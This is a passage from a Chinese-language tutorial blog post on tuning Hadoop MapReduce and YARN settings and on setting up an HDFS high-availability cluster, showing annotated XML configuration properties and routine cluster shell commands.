Buffer中的数据达到多少比例开始写入磁盘，默认值0.66。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.shuffle.merge.percent<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>0.66<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- reducetask内存，默认1g；reducetask堆内存大小默认和该值大小一致mapreduce.reduce.java.opts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.memory.mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The amount of memory to request from the scheduler for each    reduce task. If this is not specified or is non-positive, it is inferred</span><br><span class="line">    from mapreduce.reduce.java.opts and mapreduce.job.heap.memory-mb.ratio.</span><br><span class="line">    If java-opts are also not specified, we set it to 1024.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- reducetask的CPU核数，默认1个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.cpu.vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- reducetask失败重试次数，默认4次 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.maxattempts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 当MapTask完成的比例达到该值后才会为ReduceTask申请资源。默认是0.05 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.job.reduce.slowstart.completedmaps<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>0.05<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果程序在规定的默认10分钟内没有读到数据，将强制超时退出 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.task.timeout<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>600000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Yarn参数调优</strong></p><p>修改yarn-site.xml配置参数如下，最后分发</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 选择调度器，默认容量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The class to use as the resource scheduler.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ResourceManager处理调度器请求的线程数量,默认50；如果提交的任务数大于50，可以增加该值，但是不能超过3台 * 4线程 = 12线程（去除其他应用程序实际不能超过8） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Number of threads to handle scheduler interface.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.client.thread-count<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 是否让yarn自动检测硬件进行配置，默认是false，如果该节点有很多其他应用程序，建议手动配置。如果该节点没有其他应用程序，可以采用自动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Enable auto-detection of node capabilities such as</span><br><span class="line">  memory and CPU.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.detect-hardware-capabilities<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 是否将虚拟核数当作CPU核数，默认是false，采用物理CPU核数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Flag to determine if logical processors(such as</span><br><span class="line">  hyperthreads) should be counted as cores. Only applicable on Linux</span><br><span class="line">  when yarn.nodemanager.resource.cpu-vcores is set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.count-logical-processors-as-cores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 虚拟核数和物理核数乘数，默认是1.0 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Multiplier to determine how to convert phyiscal cores to</span><br><span class="line">  vcores. This value is used if yarn.nodemanager.resource.cpu-vcores</span><br><span class="line">  is set to -1(which implies auto-calculate vcores) and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is set to true. The  number of vcores will be calculated as  number of CPUs * multiplier.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.pcores-vcores-multiplier<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- NodeManager使用内存数，默认8G，修改为4G内存 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Amount of physical memory, in MB, that can be allocated </span><br><span class="line">  for containers. If set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true, it is</span><br><span class="line">  automatically calculated(in case of Windows and Linux).</span><br><span class="line">  In other cases, the default is 8192MB.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4096<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- nodemanager的CPU核数，不按照硬件环境自动设定时默认是8个，修改为4个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Number of vcores that can be allocated</span><br><span class="line">  for containers. This is used by the RM scheduler when allocating</span><br><span class="line">  resources for containers. This is not used to limit the number of</span><br><span class="line">  CPUs used by YARN containers. If it is set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true, it is</span><br><span class="line">  automatically determined from the hardware in case of Windows and Linux.</span><br><span class="line">  In other cases, number of vcores is 8 by default.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.cpu-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最小内存，默认1G --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The minimum allocation for every container request at the RM  in MBs. Memory requests lower than this will be set to the value of this  property. Additionally, a node manager that is configured to have less memory  than this value will be shut down by the resource manager.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1024<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最大内存，默认8G，修改为2G --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The maximum allocation for every container request at the RM  in MBs. Memory requests higher than this will throw an  InvalidResourceRequestException.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2048<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最小CPU核数，默认1个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The minimum allocation for every container request at the RM  in terms of virtual CPU cores. Requests lower than this will be set to the  value of this property. Additionally, a node manager that is configured to  have fewer virtual cores than this value will be shut down by the resource  manager.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最大CPU核数，默认4个，修改为2个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The maximum allocation for every container request at the RM  in terms of virtual CPU cores. Requests higher than this will throw an</span><br><span class="line">  InvalidResourceRequestException.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 虚拟内存检查，默认打开，修改为关闭 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether virtual memory limits will be enforced for</span><br><span class="line">  containers.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 虚拟内存和物理内存设置比例,默认2.1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Ratio between virtual memory to physical memory when  setting memory limits for containers. Container allocations are  expressed in terms of physical memory, and virtual memory usage  is allowed to exceed this allocation by this ratio.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-pmem-ratio<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后执行程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启集群</span></span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"><span class="comment"># 执行WordCount程序</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br><span class="line"><span class="comment"># 观察Yarn任务执行页面:http://hadoop103:8088/cluster/apps</span></span><br></pre></td></tr></table></figure><h1>六、Hadoop高可用集群部署</h1><h2 id="1、-HA-概述">1、 HA 概述</h2><p>HA（High Availablity），即高可用(7*24 小时不中断服务)，实现高可用最关键的策略是消除单点故障。HA 严格来说应该分成各个组件的 HA</p><p>机制：HDFS 的 HA 和 YARN 的 HA。NameNode 主要在以下两个方面影响 HDFS 集群</p><ul><li>NameNode 机器发生意外，如宕机，集群将无法使用，直到管理员重启</li><li>NameNode 机器需要升级，包括软件、硬件升级，此时集群也将无法使用</li></ul><p>HDFS HA 功能通过配置多个 NameNodes(Active/Standby)实现在集群中对 NameNode 的热备来解决上述问题。如果出现故障，如机器崩溃或机器需要升级维护，这时可通过此种方式将 NameNode 很快的切换到另外一台机器。</p><h2 id="2、HDFS-HA-集群搭建">2、HDFS-HA 集群搭建</h2><h3 id="2-1-集群规划">2.1 集群规划</h3><table><thead><tr><th><strong>hadoop102</strong></th><th><strong>hadoop103</strong></th><th><strong>hadoop104</strong></th></tr></thead><tbody><tr><td>NameNode</td><td></td><td>Secondarynamenode</td></tr><tr><td>DataNode</td><td>DataNode</td><td>DataNode</td></tr></tbody></table><p>HA 的主要目的是消除 namenode 的单点故障,需要将 hdfs 集群规划成以下模样</p><table><thead><tr><th><strong>hadoop102</strong></th><th><strong>hadoop103</strong></th><th><strong>hadoop104</strong></th></tr></thead><tbody><tr><td>NameNode</td><td>NameNode</td><td>NameNode</td></tr><tr><td>DataNode</td><td>DataNode</td><td>DataNode</td></tr></tbody></table><h3 id="2-2-HDFS-HA-核心问题">2.2 HDFS-HA 核心问题</h3><p><strong>怎么保证三台 namenode 的数据一致?</strong></p><ul><li>Fsimage:让一台 nn 生成数据,让其他机器 nn 同步</li><li>Edits:需要引进新的模块 JournalNode 来保证 edtis 的文件的数据一致性</li></ul><p><strong>怎么让同时只有一台 nn 是 active，其他所有是 standby 的?</strong></p><ul><li>手动分配</li><li>自动分配</li></ul><p><strong>2nn 在 ha 架构中并不存在，定期合并 fsimage 和 edtis 的活谁来干?</strong></p><ul><li>由 standby 的 nn 来干</li></ul><p><strong>如果 nn 真的发生了问题，怎么让其他的 nn 上位干活?</strong></p><ul><li>手动故障转移</li><li>自动故障转移</li></ul><h2 id="3、HDFS-HA-手动模式">3、HDFS-HA 手动模式</h2><h3 id="3-1-环境准备-v2">3.1 环境准备</h3><p>首先按照之前的配置搭建好环境，在每个集群需要启动JournalNode</p><h3 id="3-2-配置-HDFS-HA-集群">3.2 配置 HDFS-HA 集群</h3><blockquote><p>官网地址：<a href="https://hadoop.apache.org/" target="_blank" rel="noopener" title="https://hadoop.apache.org/">https://hadoop.apache.org/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 opt 目录下创建一个 ha 文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">sudo mkdir ha</span><br><span class="line">sudo chown atguigu:atguigu /opt/ha</span><br><span class="line"><span class="comment"># 将/opt/module/下的 hadoop-3.1.3 拷贝到/opt/ha 目录下（记得删除 data 和 log 目录）</span></span><br><span class="line">cp -r /opt/module/hadoop-3.1.3 /opt/ha/</span><br></pre></td></tr></table></figure><p>然后修改配置文件，这里windows可以使用sublime直接修改保存(File→SFTP/FTP→Browse Server，自行安装插件)</p><p>配置 core-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 把多个 NameNode 的地址组装成一个集群 mycluster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://mycluster<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 指定 hadoop 运行时产生文件的存储目录 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/ha/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置 hdfs-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License. See accompanying LICENSE file.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Put site-specific property overrides in this file. --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- NameNode 数据存储目录 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>file://$&#123;hadoop.tmp.dir&#125;/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- DataNode 数据存储目录 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>file://$&#123;hadoop.tmp.dir&#125;/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- JournalNode 数据存储目录 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.journalnode.edits.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;hadoop.tmp.dir&#125;/jn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 完全分布式集群名称 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.nameservices<span class="tag">&lt;/<span 